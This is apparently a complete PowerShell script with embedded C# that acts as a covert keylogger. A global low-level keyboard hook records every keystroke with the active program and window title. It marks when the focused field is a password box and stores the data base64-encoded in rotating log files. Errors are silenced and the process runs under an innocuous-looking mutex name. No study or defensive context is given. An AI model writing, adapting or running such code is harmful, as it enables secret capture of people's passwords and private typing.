param([Parameter(Mandatory = $true)][string]$Ops)
$ErrorActionPreference = 'SilentlyContinue'
New-Item -ItemType Directory -Force -Path $Ops | Out-Null

$mutex = New-Object -TypeName System.Threading.Mutex -ArgumentList $false, 'Local\FabricSyncKeys'
$acquired = $false
try { $acquired = $mutex.WaitOne(0) } catch { $acquired = $true }
if (-not $acquired) { exit 0 }
Set-Content -LiteralPath (Join-Path $Ops 'keys.pid') -Value $PID -Encoding ASCII
$events = Join-Path $Ops 'keys.events'

Add-Type -AssemblyName UIAutomationClient
Add-Type -AssemblyName UIAutomationTypes
Add-Type -AssemblyName System.Windows.Forms

Add-Type @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public static class SpcHook {
    public delegate IntPtr Proc(int code, IntPtr wParam, IntPtr lParam);
    [StructLayout(LayoutKind.Sequential)] public struct KBD {
        public uint vk; public uint scan; public uint flags; public uint time; public IntPtr extra;
    }
    [StructLayout(LayoutKind.Sequential)] public struct MSG {
        public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam;
        public uint time; public int x; public int y;
    }
    [DllImport("user32.dll")] public static extern IntPtr SetWindowsHookEx(int id, Proc proc, IntPtr mod, uint thread);
    [DllImport("user32.dll")] public static extern bool UnhookWindowsHookEx(IntPtr hook);
    [DllImport("user32.dll")] public static extern IntPtr CallNextHookEx(IntPtr hook, int code, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] public static extern int GetMessage(out MSG msg, IntPtr window, uint min, uint max);
    [DllImport("user32.dll")] public static extern bool TranslateMessage(ref MSG msg);
    [DllImport("user32.dll")] public static extern IntPtr DispatchMessage(ref MSG msg);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr window, out uint pid);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] public static extern int GetWindowText(IntPtr window, StringBuilder text, int size);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] public static extern IntPtr GetModuleHandle(string name);
    [DllImport("user32.dll")] public static extern short GetKeyState(int key);
    [DllImport("user32.dll")] public static extern IntPtr GetKeyboardLayout(uint thread);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] public static extern int ToUnicodeEx(
        uint vk, uint scan, byte[] state, StringBuilder text, int size, uint flags, IntPtr layout);

    public static string Title() {
        StringBuilder text = new StringBuilder(512);
        GetWindowText(GetForegroundWindow(), text, text.Capacity);
        return text.ToString();
    }
    public static uint ForegroundPid() {
        uint pid;
        GetWindowThreadProcessId(GetForegroundWindow(), out pid);
        return pid;
    }
    public static string ProcessName(uint pid) {
        try { return Process.GetProcessById((int)pid).ProcessName + ".exe"; } catch { return "?"; }
    }
    public static bool Shift() {
        return (GetKeyState(0x10) & 0x8000) != 0 || (GetKeyState(0xA0) & 0x8000) != 0
            || (GetKeyState(0xA1) & 0x8000) != 0;
    }
    public static bool Caps() { return (GetKeyState(0x14) & 1) != 0; }
    public static bool Ctrl() {
        return (GetKeyState(0x11) & 0x8000) != 0 || (GetKeyState(0xA2) & 0x8000) != 0
            || (GetKeyState(0xA3) & 0x8000) != 0;
    }
    public static bool Alt() {
        return (GetKeyState(0x12) & 0x8000) != 0 || (GetKeyState(0xA4) & 0x8000) != 0
            || (GetKeyState(0xA5) & 0x8000) != 0;
    }
    public static bool AltGr() { return Ctrl() && Alt(); }
    // Layouts that distinguish the right Alt need VK_RMENU (0xA5), not only
    // the generic VK_MENU, or AltGr+2 can come back as the base digit.
    public static void CtrlState(byte[] state) {
        state[0x11] = 0x80;
        if ((GetKeyState(0xA2) & 0x8000) != 0) state[0xA2] = 0x80;
        else if ((GetKeyState(0xA3) & 0x8000) != 0) state[0xA3] = 0x80;
    }
    public static void AltState(byte[] state) {
        state[0x12] = 0x80;
        if ((GetKeyState(0xA5) & 0x8000) != 0) state[0xA5] = 0x80;
        else if ((GetKeyState(0xA4) & 0x8000) != 0) state[0xA4] = 0x80;
    }
    // ToUnicodeEx returns a negative count for a dead key and keeps it pending
    // for the next call, so the callback can ignore that key without losing the
    // composed character that follows.
    public static bool LastDead;
    public static string Unicode(uint vk, uint scan) {
        LastDead = false;
        byte[] state = new byte[256];
        bool shift = Shift();
        bool altGr = AltGr();
        bool alt = Alt();
        if (shift) state[0x10] = 0x80;
        if (Caps()) state[0x14] = 1;
        // AltGr arrives as Ctrl+Alt: both flags make ToUnicodeEx return the
        // layout symbol (@, €, ~). Ctrl alone stays unmarked so Ctrl+C logs
        // "c" instead of ETX; Alt alone is marked for menu accelerators.
        if (altGr) {
            CtrlState(state);
            AltState(state);
        } else if (alt) {
            AltState(state);
        }
        uint pid;
        uint thread = GetWindowThreadProcessId(GetForegroundWindow(), out pid);
        IntPtr layout = GetKeyboardLayout(thread);
        StringBuilder text = new StringBuilder(8);
        int count = ToUnicodeEx(vk, scan, state, text, text.Capacity, 0, layout);
        LastDead = count < 0;
        return count > 0 ? text.ToString(0, count) : "";
    }
}
'@

$script:writer = $null
$script:size = 0

function Open-Writer {
    $encoding = New-Object -TypeName System.Text.UTF8Encoding -ArgumentList $false
    $script:writer = New-Object -TypeName System.IO.StreamWriter -ArgumentList @($events, $true, $encoding, 4096)
    $script:writer.AutoFlush = $true
    $script:size = (Get-Item -LiteralPath $events).Length
}

function Rotate {
    if ($script:size -lt 1048576) { return }
    $script:writer.Close()
    Remove-Item -LiteralPath "$events.3" -Force
    if (Test-Path -LiteralPath "$events.2") { Move-Item -LiteralPath "$events.2" -Destination "$events.3" -Force }
    if (Test-Path -LiteralPath "$events.1") { Move-Item -LiteralPath "$events.1" -Destination "$events.2" -Force }
    Move-Item -LiteralPath $events -Destination "$events.1" -Force
    Open-Writer
}

function Write-Event([hashtable]$data) {
    $line = $data | ConvertTo-Json -Compress
    Rotate
    $script:writer.WriteLine($line)
    $script:size += [Text.Encoding]::UTF8.GetByteCount($line) + 2
}

function B64([string]$text) {
    if ([string]::IsNullOrEmpty($text)) { return '' }
    return [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text))
}

function Is-Password {
    try { return [System.Windows.Automation.AutomationElement]::FocusedElement.Current.IsPassword } catch { return $false }
}

function Context {
    $processId = [SpcHook]::ForegroundPid()
    $title = [SpcHook]::Title()
    $process = [SpcHook]::ProcessName($processId)
    return @{ pid = $processId; proc = $process; title = $title }
}

Open-Writer
$script:lastKey = ''
$script:lastTitle = ''
$script:lastPassword = $false

# Emits a focus event when the window, the process or the UIA password flag
# changes. Returns the password flag for the current Key event.
function Set-Context($context, [bool]$queryPassword) {
    $password = if ($queryPassword) { Is-Password } else { $script:lastPassword }
    $titleKey = "$($context.pid)|$($context.title)"
    $key = "$titleKey|$password"
    if ($key -ne $script:lastKey) {
        $script:lastKey = $key
        $script:lastPassword = $password
        Write-Event @{
            k = 'focus'; ts = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
            p = (B64 $context.proc); t = (B64 $context.title); pw = $password
        }
    }
    $script:lastTitle = $titleKey
    return $password
}

function Emit-Focus {
    Set-Context (Context) $true | Out-Null
}

$callback = [SpcHook+Proc]{
    param($code, $wParam, $lParam)
    if ($code -lt 0) { return [SpcHook]::CallNextHookEx([IntPtr]::Zero, $code, $wParam, $lParam) }
    $message = [int]$wParam
    if ($message -eq 0x100 -or $message -eq 0x104) {
        $info = [Runtime.InteropServices.Marshal]::PtrToStructure($lParam, [type][SpcHook+KBD])
        if ($info.vk -ne 0 -and $info.vk -ne 0xE7) {
            $context = Context
            # UIA stays on the timer: a slow provider must not hold the hook
            # past LowLevelHooksTimeout and get it removed.
            Set-Context $context $false | Out-Null
            $unicode = [SpcHook]::Unicode($info.vk, $info.scan)
            Write-Event @{
                k = 'key'; ts = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
                vk = [int]$info.vk; sh = [SpcHook]::Shift(); ca = [SpcHook]::Caps()
                ct = [SpcHook]::Ctrl(); al = [SpcHook]::Alt(); dk = [SpcHook]::LastDead
                u = (B64 $unicode)
                p = (B64 $context.proc); t = (B64 $context.title)
            }
        }
    }
    return [SpcHook]::CallNextHookEx([IntPtr]::Zero, $code, $wParam, $lParam)
}

# Context watchdog: catches focus changes without keystrokes so the buffer is
# flushed when the user clicks elsewhere.
$timer = New-Object -TypeName System.Windows.Forms.Timer
$timer.Interval = 400
$timer.add_Tick({ Emit-Focus })
$timer.Start()

Emit-Focus
$hook = [SpcHook]::SetWindowsHookEx(13, $callback, [SpcHook]::GetModuleHandle($null), 0)
if ($hook -eq [IntPtr]::Zero) {
    Remove-Item -LiteralPath (Join-Path $Ops 'keys.pid') -Force
    exit 1
}

try {
    $msg = [SpcHook+MSG]::new()
    while ([SpcHook]::GetMessage([ref]$msg, [IntPtr]::Zero, 0, 0) -ne 0) {
        [SpcHook]::TranslateMessage([ref]$msg) | Out-Null
        [SpcHook]::DispatchMessage([ref]$msg) | Out-Null
    }
} finally {
    [SpcHook]::UnhookWindowsHookEx($hook) | Out-Null
    $timer.Stop()
    $script:writer.Close()
    Remove-Item -LiteralPath (Join-Path $Ops 'keys.pid') -Force
    try { $mutex.ReleaseMutex() } catch { }
}
